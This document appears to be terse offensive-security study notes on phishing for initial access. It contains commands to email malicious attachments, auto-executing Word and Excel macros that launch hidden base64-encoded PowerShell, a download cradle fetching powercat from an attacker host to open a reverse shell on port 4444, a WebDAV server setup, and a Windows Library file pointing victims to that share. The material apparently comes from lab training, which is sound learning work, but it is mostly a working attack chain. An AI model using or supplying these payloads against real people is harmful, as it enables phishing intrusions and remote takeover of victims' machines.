## swaks

```sh
swaks --to test@supermagicorg.com
      --from test@supermagicorg.com
      --server 192.168.234.199 
      --auth-user test@supermagicorg.com
      --auth-password test
      --port 25
      --header 'Subject: test'
      --body @body.txt
      --attach @Config.Library-ms
```

## Sendmail

```sh

$ sendemail -f 'jonas@localhost' \
            -t 'mailadmin@localhost' \
            -s 192.168.120.132:25 \
            -u 'Your spreadsheet' \
            -m 'Here is your requested spreadsheet' \
            -a bomb.ods
```



Leveraging Microsoft Word Macros

# Macro automatically executing powershell.exe after opening the Document
# Saving Document as .doc or  .docm to embed macro

Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"

End Sub


# PowerShell download cradle and PowerCat reverse shell
# To base64-encode our command
IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI/powercat.ps1');powercat -c $KALI -p 4444 -e powershell

https://www.base64encode.org/

# Python script to split the base64-encoded string into smaller chunks of 50 characters
# and concatenate them into the Str variable

str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')


# Macro invoking PowerShell to create a reverse shell
# Word
Sub AutoOpen()
    MyMacro
End Sub
# Excel
Sub Auto_Open() # Workbook_Open()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    ...
    Str = Str + "A== " ← There is a blank here, it's strange !
    CreateObject("Wscript.Shell").Run Str
End Sub

set up a WebDAV

pip3 install wsgidav
/home/kali/.local/bin/wsgidav --host=$KALI --port=80 --auth=anonymous --root /home/kali/webdav/

Abusing Windows Library Files

# Visual Studio Code (VSC) config.Library-ms
# Windows Library Description code for connecting to our WebDAV Share

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>